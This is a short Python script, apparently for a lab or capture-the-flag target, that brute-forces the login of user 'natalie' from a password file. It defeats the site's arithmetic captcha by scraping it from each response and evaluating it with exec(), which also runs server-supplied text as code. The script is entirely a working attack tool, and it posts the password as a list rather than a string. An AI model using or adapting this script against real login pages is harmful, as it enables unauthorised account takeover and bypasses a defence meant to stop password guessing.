#!/usr/bin/python3

import requests
import re

url = "http://10.10.21.236/login"

psw_file =  open("passwords.txt", "r")

for i in range(10):
	data = {"username":"natalie", "password":"test"}
	r = requests.post(url, data=data)

for i in psw_file:

	passwd = i.split()

	captcha = re.findall("[0-9]* + .* = \?", r.text)
	exec("captcha_result =" + captcha[0][4:-4])

	data = {"username":"natalie", "password":passwd, "captcha":captcha_result}
	r = requests.post(url, data=data)

	if not "Invalid password" in r.text:
		print(f"\033[1;32m[+] Password Found! : " + str(passwd[0]))
